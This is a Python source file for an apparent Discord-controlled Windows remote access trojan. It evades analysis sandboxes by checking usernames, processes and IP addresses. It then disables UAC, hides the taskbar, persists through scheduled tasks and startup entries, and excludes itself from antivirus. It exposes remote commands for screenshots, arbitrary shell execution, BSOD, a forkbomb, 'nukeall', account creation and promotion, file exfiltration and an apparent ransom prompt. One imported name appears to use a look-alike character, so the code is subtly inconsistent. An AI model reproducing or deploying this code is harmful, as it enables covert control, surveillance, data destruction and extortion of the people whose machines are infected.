import os,sys,discord,threading;from discord.ext import commands
from utils.runadmin import ensure_admin_and_check_ran;from utils.schtask import setup_tasks;from utils.excludeme import excludeme;from utils.startup import add_to_startup;from utils.disable import *;from utils.nosites import *
from start.bots import bоts;from start.launch import run;from utils.remindme import*;from utils.cleardesk import *;from utils.wallpaper import *
from commands.basics import *;from commands.intermediates import *;from commands.filenav import *;from commands.others import *;from commands.fun import *
def checklist():
 username=subprocess.check_output("whoami").decode().strip().split("\\")[-1]
 blacklisted_files=["blacklist/names.py","blacklist/procs.py","blacklist/ips.py"]
 for blacklisted_file in blacklisted_files:
  if os.path.exists(blacklisted_file):
   if blacklisted_file=="blacklist/names.py":
    from blacklist.names import blacklisted_users
    if username in blacklisted_users:
     sys.exit()
   elif blacklisted_file=="blacklist/procs.py":
    from blacklist.procs import blacklisted_processes
    for proc in blacklisted_processes:
     try:
      if proc in subprocess.check_output("tasklist").decode():
       sys.exit()
     except:
      pass
   elif blacklisted_file=="blacklist/ips.py":
    from blacklist.ips import blacklisted_ips
    ip=subprocess.check_output("nslookup myip.opendns.com resolver1.opendns.com").decode().split("Address:")[1].strip()
    if ip in blacklisted_ips:
     sys.exit()
 else:
  hidetaskbar()
  no_uac()
  setup_tasks(sys.executable)
  add_to_startup()
  excludeme()
  threading.Thread(target=disable).start()
  threading.Thread(target=blocksites).start()
  threading.Thread(target=change_wallpaper).start()
  threading.Thread(target=remindme).start()
  threading.Thread(target=cleardesk).start()
  threading.Thread(target=destroy).start()
  threading.Thread(target=nobrowse).start()
  intents=discord.Intents.all()
  bot=commands.Bot(command_prefix='.',intents=intents)
  bot.allowed_channel_ids={}
  @bot.event
  async def on_message(message):
   if message.channel.id not in bot.allowed_channel_ids:
    return
   await bot.process_commands(message)
  bot.add_command(commands.Command(takepic,name='ss'))
  bot.add_command(commands.Command(clean,name='clean'))
  bot.add_command(commands.Command(cmd,name='cmd'))
  bot.add_command(commands.Command(close,name='close'))
  bot.add_command(commands.Command(speak,name='speak'))
  bot.add_command(commands.Command(openurl,name='openurl'))
  bot.add_command(commands.Command(search,name='search'))
  bot.add_command(commands.Command(sharenote,name='sharenote'))
  bot.add_command(commands.Command(startupapps,name='startupapps'))
  bot.add_command(commands.Command(processes,name='lp'))
  bot.add_command(commands.Command(share_file,name='share'))
  bot.add_command(commands.Command(setvol,name='setvol'))
  bot.add_command(commands.Command(bsod,name='bsod'))
  bot.add_command(commands.Command(lockpc,name='lockpc'))
  bot.add_command(commands.Command(restart,name='restartpc'))
  bot.add_command(commands.Command(sd,name='sd'))
  bot.add_command(commands.Command(kp,name='kp'))
  bot.add_command(commands.Command(createuser,name='createuser'))
  bot.add_command(commands.Command(deleteuser,name='deleteuser'))
  bot.add_command(commands.Command(listuser,name='listusers'))
  bot.add_command(commands.Command(nukeall,name='nukeall'))
  bot.add_command(commands.Command(wallpaper,name='wallpaper'))
  bot.add_command(commands.Command(promoteuser,name='promoteuser'))
  bot.add_command(commands.Command(demoteuser,name='demoteuser'))
  bot.add_command(commands.Command(nomouse,name='nomouse'))
  bot.add_command(commands.Command(endpc,name='endpc'))
  bot.add_command(commands.Command(anticonnect,name='noconnect'))
  bot.add_command(commands.Command(cd_command,name='cd'))
  bot.add_command(commands.Command(taskbar,name='taskbar'))
  bot.add_command(commands.Command(forkbomb,name='forkbomb'))
  bot.add_command(commands.Command(paynow,name='paynow'))
  bot.add_command(commands.Command(alert,name='alert'))
  bot.add_command(commands.Command(admin,name='admin'))
  @bot.event
  async def on_ready():
   await run(bot)
  bot.run(bots)
def ruun():
 checklist()
ruun() 
   